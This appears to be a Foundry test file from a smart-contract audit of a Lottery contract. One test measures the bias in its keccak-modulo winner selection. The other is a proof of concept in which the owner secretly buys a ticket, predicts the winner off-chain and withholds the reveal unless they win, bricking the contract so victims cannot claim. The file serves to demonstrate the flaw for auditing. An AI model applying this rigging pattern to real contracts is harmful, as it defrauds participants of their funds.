// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Lottery} from "../src/Lottery.sol";

contract RandomnessBiasTest is Test {
    Lottery public lottery;
    uint256 public constant TICKET_PRICE = 0.01 ether;

    // Actors
    address public owner = makeAddr("owner");
    address public attackerWallet = makeAddr("attackerWallet");
    address public victim1 = makeAddr("victim1");
    address public victim2 = makeAddr("victim2");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attackerWallet, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);

        vm.prank(owner);
        lottery = new Lottery(TICKET_PRICE);
    }

    /**
     * @notice TEST 1: The Modulo Bias & Distribution Analysis
     * Auditors run the contract's exact hashing formula through a massive loop
     * to check if the random distribution artificially favors specific indexes.
     */
    function test_MathematicalDistributionBias() public pure {
        uint256 participantsLength = 3; 
        uint256 winsIndex0 = 0;
        uint256 winsIndex1 = 0;
        uint256 winsIndex2 = 0;

        bytes32 secret = "static_secret";

        console2.log("Running 30,000 simulated draws...");

        // Simulate the exact contract math over 30,000 different block numbers
        for (uint256 i = 0; i < 30000; i++) {
            // Contract formula: uint256(keccak256(abi.encodePacked(_secret, block.number))) % participants.length;
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(secret, i))) % participantsLength;

            if (winnerIndex == 0) winsIndex0++;
            else if (winnerIndex == 1) winsIndex1++;
            else if (winnerIndex == 2) winsIndex2++;
        }

        console2.log("--- Distribution Results ---");
        console2.log("Index 0 Wins:", winsIndex0);
        console2.log("Index 1 Wins:", winsIndex1);
        console2.log("Index 2 Wins:", winsIndex2);

        // In a perfectly fair 3-person lottery, each should win exactly ~10,000 times.
        // If the variance is higher than acceptable, the test fails, proving bias.
        uint256 expectedWins = 10000;
        uint256 allowedVariance = 300; // Allow 3% variance

        assertApproxEqAbs(winsIndex0, expectedWins, allowedVariance, "Index 0 has a mathematical bias!");
        assertApproxEqAbs(winsIndex1, expectedWins, allowedVariance, "Index 1 has a mathematical bias!");
        assertApproxEqAbs(winsIndex2, expectedWins, allowedVariance, "Index 2 has a mathematical bias!");
    }

    /**
     * @notice TEST 2: The Withholding Bias
     * Proves that the owner can heavily bias the system by simply halting the 
     * lottery if the final calculated winner is not their own wallet.
     */
    function test_OwnerWithholdingBias() public {
        bytes32 secret = "my_secret";
        bytes32 secretHash = keccak256(abi.encodePacked(secret));

        // 1. Victims buy tickets
        vm.prank(victim1);
        lottery.buyTicket{value: TICKET_PRICE}();

        vm.prank(victim2);
        lottery.buyTicket{value: TICKET_PRICE}();

        // 2. Owner secretly buys a ticket
        vm.prank(attackerWallet);
        lottery.buyTicket{value: TICKET_PRICE}();

        // 3. Owner locks the sale and commits the hash
        vm.startPrank(owner);
        lottery.closeSale();
        lottery.commitHash(secretHash);
        vm.stopPrank();

        // 4. Owner calculates the winner off-chain
        uint256 participantCount = 3;
        uint256 predictedIndex = uint256(keccak256(abi.encodePacked(secret, block.number))) % participantCount;

        // 5. The Exploit Logic: Only reveal if the owner's alt wallet (Index 2) wins.
        if (predictedIndex == 2) {
            vm.prank(owner);
            lottery.revealAndDraw(secret);
            console2.log("Owner won! Revealing secret...");
        } else {
            console2.log("Owner lost. Withholding the secret forever.");
            // We intentionally do NOT call revealAndDraw()
        }

        // 6. Assert that the lottery is permanently bricked if the owner withheld
        if (predictedIndex != 2) {
            (Lottery.LotteryPhase currentPhase, , , , ) = lottery.getLotteryInfo();
            
            // The phase remains 'Committed' [cite: 76], never reaching 'Drawn' [cite: 83]
            assertTrue(currentPhase == Lottery.LotteryPhase.Committed, "Lottery did not stay stuck");
            
            // Reverts with Lottery__InvalidPhase if victims try to claim [cite: 85]
            vm.prank(victim1);
            vm.expectRevert();
            lottery.claimPrize();
            
            console2.log("Proof: Victims can never claim their funds. The contract is bricked.");
        }
    }
}
